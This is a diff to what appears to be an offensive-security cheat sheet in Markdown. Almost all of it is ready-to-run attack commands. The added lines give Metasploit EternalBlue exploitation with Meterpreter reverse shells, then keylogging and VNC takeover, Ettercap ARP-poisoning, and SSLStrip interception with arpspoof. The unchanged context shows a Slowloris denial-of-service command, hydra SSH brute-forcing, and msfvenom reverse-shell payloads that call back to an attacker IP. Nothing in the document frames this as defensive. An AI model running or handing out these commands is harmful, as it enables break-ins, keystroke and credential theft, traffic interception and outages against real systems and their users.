@@ -13,6 +13,7 @@
 
 ## Denial Of Service
 Slowloris (GET Exploit)
+-----
 Perl Example
 ```
 perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
@@ -98,7 +99,6 @@ hydra -L user.txt -P pass.txt [IP_TARGET] ssh
 
 ## Payload Msvenom
 Payload Reverse Shell
-
 | Target | Example |
 | --- | --- |
 | Android | msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=4444 R > payload.apk |
@@ -111,9 +111,76 @@ Payload Reverse Shell
 | Bash | msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh |
 
 ## Meterpreter
+Windows 10 64bit
+```
+msfconsole -q
+search ms17_010_ethernalblue
+use exploit [ms17_010_ethernalblue]
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost [ip target]
+exploit
+```
+Windows 10 SMB Exploit
+```
+msfconsole -q
+use exploit windows/smb/eternalblue_doublepulsar
+set payload windows/meterpreter/reverse_tcp
+set rhost [ip target]
+exploit
+```
+Windows Access From Attacker
+```
+shell => Access CMD Windows
+run vnc
+migrate exploler.exe
+keyscan_start
+keyscan_dump
+```
 
-## MITM (Man In The Middle)
-## Ethercap
-## SSLStrip
+## MITM Ethercap
+
+```
+Ettercap -G
+
+options
+enable promisc mode => ethernet mode
+disable promisc mode => wireless mode
+
+sniff
+unified sniffing
+network interface => eth0
+
+host
+hostlist
+add target 1 => router
+add target 2 => pc
+
+target
+enable current target
+
+plugins
+manage the plugins
+remote_browser
+
+mitm
+arp poisoning
+enable sniff remote connection
+```
+
+## MITM SSLStrip
+Forwarding Port
+```
+echo 1> /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to- port 10000
+```
+ARP Spoofing
+```
+arpspoof -i eth0 -t [IP_TARGET] -r [IP_ROUTER]
+sslstrip -l 10000
+```
+Log SSL Strip
+```
+sslstrip.log
+```
 
 
